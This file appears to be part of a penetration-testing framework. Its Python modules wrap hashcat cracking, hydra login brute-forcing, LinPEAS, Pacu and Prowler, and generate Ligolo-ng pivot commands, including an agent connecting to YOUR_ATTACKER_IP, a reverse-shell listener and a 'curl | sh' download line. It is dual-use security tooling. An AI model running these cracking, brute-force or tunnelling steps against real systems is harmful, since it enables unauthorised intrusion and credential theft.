"""Post-exploitation and credential modules."""
import re
import tempfile
from pathlib import Path

from . import BaseModule, Finding, ModuleResult, Severity


# ── Hashcat ───────────────────────────────────────────────────────────────────

class HashcatModule(BaseModule):
    name = "hashcat"
    description = "Hashcat — GPU-accelerated password cracker"
    default_timeout = 3600

    # Common mode shortcuts
    _MODES = {
        "ntlm": "1000",
        "ntlmv2": "5600",
        "md5": "0",
        "sha1": "100",
        "sha256": "1400",
        "bcrypt": "3200",
        "md5crypt": "500",
        "sha512crypt": "1800",
        "wpa": "22000",
        "kerberoast": "13100",
        "asreproast": "18200",
    }

    def run(self, target: str, options: dict) -> ModuleResult:
        if not self.tool_check_emit("hashcat"):
            return ModuleResult(success=False, error="hashcat not found")

        hash_file = options.get("hash_file", target)
        wordlist = options.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        mode_key = options.get("mode", "ntlm")
        rules = options.get("rules", "")

        mode = self._MODES.get(mode_key.lower(), mode_key)

        cmd = [
            "hashcat",
            "-m", mode,
            hash_file,
            wordlist,
            "--force",
            "--quiet",
            "--potfile-disable",
            "--status", "--status-timer", "30",
        ]
        if rules:
            cmd += ["-r", rules]

        self._emit(f"[*] {' '.join(cmd)}")
        self._emit(f"[*] Mode: {mode_key} ({mode})")
        rc, stdout, stderr = self.run_command(cmd)

        findings = self.parse_output(stdout)
        return ModuleResult(
            success=rc in (0, 1),
            findings=findings,
            raw_output=stdout,
            command=" ".join(cmd),
        )

    def parse_output(self, output: str) -> list[Finding]:
        findings: list[Finding] = []
        cracked: list[str] = []
        for line in output.splitlines():
            # hashcat prints hash:password on crack
            if ":" in line and not line.startswith("[") and not line.startswith("Session"):
                parts = line.rsplit(":", 1)
                if len(parts) == 2 and parts[1].strip():
                    cracked.append(line.strip())

        if cracked:
            findings.append(Finding(
                title=f"Hashcat: {len(cracked)} password(s) cracked",
                description="Cracked credentials — rotate immediately",
                severity=Severity.CRITICAL,
                evidence="\n".join(cracked[:50]),
                module=self.name,
            ))
        return findings


# ── Hydra ─────────────────────────────────────────────────────────────────────

class HydraModule(BaseModule):
    name = "hydra"
    description = "Hydra — network login brute-forcer"
    default_timeout = 600

    def run(self, target: str, options: dict) -> ModuleResult:
        if not self.tool_check_emit("hydra"):
            return ModuleResult(success=False, error="hydra not found")

        service = options.get("service", "ssh")
        userlist = options.get("userlist", "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt")
        passlist = options.get("passlist", "/usr/share/wordlists/rockyou.txt")
        tasks = options.get("tasks", 4)
        port = options.get("port", "")

        cmd = [
            "hydra",
            "-L", userlist,
            "-P", passlist,
            "-t", str(tasks),
            "-e", "nsr",   # try null, same-as-user, and reverse
        ]
        if port:
            cmd += ["-s", str(port)]

        cmd += [target, service]

        self._emit(f"[*] {' '.join(cmd)}")
        rc, stdout, stderr = self.run_command(cmd)

        findings = self.parse_output(stdout)
        return ModuleResult(
            success=rc == 0,
            findings=findings,
            raw_output=stdout,
            command=" ".join(cmd),
        )

    def parse_output(self, output: str) -> list[Finding]:
        findings: list[Finding] = []
        for line in output.splitlines():
            m = re.search(r"\[(\d+)\]\[(\w+)\] host: (\S+)\s+login: (\S+)\s+password: (\S+)", line)
            if m:
                port, svc, host, user, pwd = m.groups()
                findings.append(Finding(
                    title=f"Hydra: Valid credentials — {user}:{pwd} on {host}:{port}/{svc}",
                    description=f"Service: {svc} | Host: {host}:{port}",
                    severity=Severity.CRITICAL,
                    evidence=line.strip(),
                    module=self.name,
                    target=f"{host}:{port}",
                ))
        return findings


# ── LinPEAS ───────────────────────────────────────────────────────────────────

class LinpeasModule(BaseModule):
    name = "linpeas"
    description = "LinPEAS — Linux Privilege Escalation Awesome Script"
    default_timeout = 300

    def run(self, target: str, options: dict) -> ModuleResult:
        script_path = options.get("script_path", "/tmp/linpeas.sh")

        if not Path(script_path).exists():
            self._emit(f"[!] linpeas.sh not found at {script_path}")
            self._emit("[*] Download: curl -sL https://linpeas.sh | sh")
            self._emit("[*] Or: curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh")
            return ModuleResult(
                success=False,
                error=f"linpeas.sh not found at {script_path}",
            )

        # target is ignored — linpeas runs locally
        cmd = ["bash", script_path, "-a"]
        self._emit(f"[*] {' '.join(cmd)}")
        rc, stdout, stderr = self.run_command(cmd, timeout=self.default_timeout)

        findings = self.parse_output(stdout)
        return ModuleResult(
            success=rc == 0,
            findings=findings,
            raw_output=stdout[:100000],  # cap at 100k chars
            command=" ".join(cmd),
        )

    def parse_output(self, output: str) -> list[Finding]:
        findings: list[Finding] = []
        # LinPEAS uses ANSI color codes to indicate severity:
        # Red/Bold = Critical, Yellow = Medium, etc.
        # Strip ANSI and look for key phrases
        clean = re.sub(r"\x1b\[[0-9;]*m", "", output)

        patterns = [
            (r"(SUID|SGID) binary.*?:\s*(.+)", Severity.HIGH, "SUID/SGID binary"),
            (r"sudo.*?NOPASSWD.*?:\s*(.+)", Severity.CRITICAL, "Sudo NOPASSWD"),
            (r"writable.*?(/etc/\S+)", Severity.CRITICAL, "Writable sensitive file"),
            (r"CVE-\d{4}-\d+", Severity.HIGH, "Kernel/Software CVE"),
            (r"Password.*?found.*?:\s*(.+)", Severity.CRITICAL, "Hardcoded password"),
            (r"\.ssh/.*?(id_rsa|authorized_keys)", Severity.HIGH, "SSH key/config"),
            (r"(interesting|readable) file.*?:\s*(.+)", Severity.MEDIUM, "Interesting file"),
        ]

        for pattern, sev, tag in patterns:
            for m in re.finditer(pattern, clean, re.IGNORECASE):
                line = m.group(0)[:150]
                findings.append(Finding(
                    title=f"LinPEAS: {tag} — {line[:80]}",
                    description=f"Privilege escalation vector: {tag}",
                    severity=sev,
                    evidence=line,
                    module=self.name,
                ))
        return findings


# ── Pacu ──────────────────────────────────────────────────────────────────────

class PacuModule(BaseModule):
    name = "pacu"
    description = "Pacu — AWS exploitation framework (non-interactive mode)"
    default_timeout = 600

    def run(self, target: str, options: dict) -> ModuleResult:
        if not self.tool_check_emit("pacu"):
            return ModuleResult(success=False, error="pacu not found (pip install pacu)")

        module = options.get("module", "iam__enum_permissions")
        session_name = options.get("session", "reaper")
        profile = options.get("aws_profile", "")

        cmd = [
            "pacu",
            "--session", session_name,
            "--module-name", module,
            "--no-background",
        ]
        if profile:
            cmd += ["--pacu-aws-profile", profile]

        self._emit(f"[*] Running Pacu module: {module}")
        self._emit(f"[*] {' '.join(cmd)}")
        rc, stdout, stderr = self.run_command(cmd)

        findings = self.parse_output(stdout)
        return ModuleResult(
            success=rc == 0,
            findings=findings,
            raw_output=stdout,
            command=" ".join(cmd),
        )

    def parse_output(self, output: str) -> list[Finding]:
        findings: list[Finding] = []
        risk_patterns = [
            (r"(admin|Administrator|AdministratorAccess)", Severity.CRITICAL, "AWS Admin access"),
            (r"(secret.*?key|access.*?key)", Severity.CRITICAL, "AWS credential"),
            (r"(privilege.*?escalat|privesc)", Severity.HIGH, "AWS privilege escalation"),
            (r"(public.*?bucket|bucket.*?public)", Severity.HIGH, "Public S3 bucket"),
        ]
        for pattern, sev, tag in risk_patterns:
            for m in re.finditer(pattern, output, re.IGNORECASE):
                findings.append(Finding(
                    title=f"Pacu: {tag}",
                    description=m.group(0)[:200],
                    severity=sev,
                    evidence=m.group(0),
                    module=self.name,
                ))
        return findings


# ── Prowler ───────────────────────────────────────────────────────────────────

class ProwlerModule(BaseModule):
    name = "prowler"
    description = "Prowler — AWS/GCP/Azure security posture assessment"
    default_timeout = 1200

    _SEV_MAP = {
        "critical": Severity.CRITICAL,
        "high": Severity.HIGH,
        "medium": Severity.MEDIUM,
        "low": Severity.LOW,
        "informational": Severity.INFO,
    }

    def run(self, target: str, options: dict) -> ModuleResult:
        if not self.tool_check_emit("prowler"):
            return ModuleResult(success=False, error="prowler not found (pip install prowler)")

        provider = options.get("provider", "aws")
        region = options.get("region", "")
        services = options.get("services", "")
        tmpdir = tempfile.mkdtemp(prefix="reaper_prowler_")

        cmd = [
            "prowler", provider,
            "--output-formats", "json",
            "--output-directory", tmpdir,
            "--no-banner",
        ]
        if region:
            cmd += ["-r", region]
        if services:
            cmd += ["--services", services]

        self._emit(f"[*] {' '.join(cmd)}")
        rc, stdout, stderr = self.run_command(cmd)

        findings = self._parse_json_output(tmpdir)
        return ModuleResult(
            success=rc == 0,
            findings=findings,
            raw_output=stdout,
            command=" ".join(cmd),
        )

    def _parse_json_output(self, output_dir: str) -> list[Finding]:
        findings: list[Finding] = []
        for json_file in Path(output_dir).glob("*.json"):
            try:
                import json as _json
                data = _json.loads(json_file.read_text())
                for item in (data if isinstance(data, list) else [data]):
                    status = item.get("Status", "").upper()
                    if status != "FAIL":
                        continue
                    severity_raw = item.get("Severity", "medium").lower()
                    sev = self._SEV_MAP.get(severity_raw, Severity.MEDIUM)
                    check_id = item.get("CheckID", "?")
                    check_title = item.get("CheckTitle", "?")
                    resource = item.get("ResourceArn", item.get("ResourceId", ""))
                    description = item.get("Description", "")

                    findings.append(Finding(
                        title=f"Prowler [{check_id}]: {check_title[:80]}",
                        description=description,
                        severity=sev,
                        evidence=f"Resource: {resource}",
                        module=self.name,
                        target=resource,
                    ))
            except Exception:
                continue
        return findings


# ── Ligolo-ng Helper ──────────────────────────────────────────────────────────

class LigoloModule(BaseModule):
    name = "ligolo"
    description = "Ligolo-ng — generate tunnel setup commands and configuration helper"
    default_timeout = 10

    def run(self, target: str, options: dict) -> ModuleResult:
        """
        Generates ligolo-ng setup instructions and commands.
        Ligolo-ng requires manual setup on both ends, so this module
        generates all the commands rather than running them directly.
        """
        operator_ip = options.get("operator_ip", "YOUR_ATTACKER_IP")
        proxy_port = options.get("proxy_port", "11601")
        ui_port = options.get("ui_port", "1080")
        iface = options.get("interface", "ligolo")
        pivot_cidr = options.get("pivot_network", "192.168.0.0/24")

        lines = [
            "═══ LIGOLO-NG TUNNEL SETUP ═══",
            "",
            "## 1. On your operator machine (Kali/Linux)",
            f"   # Create tunnel interface",
            f"   sudo ip tuntap add user $(whoami) mode tun {iface}",
            f"   sudo ip link set {iface} up",
            "",
            f"   # Start the proxy (listening for agents)",
            f"   ./proxy -selfcert -laddr 0.0.0.0:{proxy_port}",
            "",
            "## 2. On the pivot machine (target)",
            f"   # Linux",
            f"   ./agent -connect {operator_ip}:{proxy_port} -ignore-cert",
            f"   # Windows",
            f"   agent.exe -connect {operator_ip}:{proxy_port} -ignore-cert",
            "",
            "## 3. In the ligolo-ng proxy console",
            f"   session                          # select the session",
            f"   start                            # start tunneling",
            "",
            "## 4. Add route on operator machine",
            f"   sudo ip route add {pivot_cidr} dev {iface}",
            "",
            f"## 5. Optional: add a local listener for reverse shells from pivot network",
            f"   listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444",
            "",
            "## Downloads",
            "   https://github.com/nicocha30/ligolo-ng/releases",
        ]

        for line in lines:
            self._emit(line)

        raw = "\n".join(lines)

        findings = [
            Finding(
                title="Ligolo-ng tunnel configuration generated",
                description=(
                    f"Operator IP: {operator_ip} | Proxy port: {proxy_port}\n"
                    f"Pivot network: {pivot_cidr}\n\n"
                    "Run `reaper findings` to review. Commands saved to raw_output."
                ),
                severity=Severity.INFO,
                evidence=raw,
                module=self.name,
                target=target,
            )
        ]

        return ModuleResult(
            success=True,
            findings=findings,
            raw_output=raw,
            command="ligolo-ng (config generator)",
        )
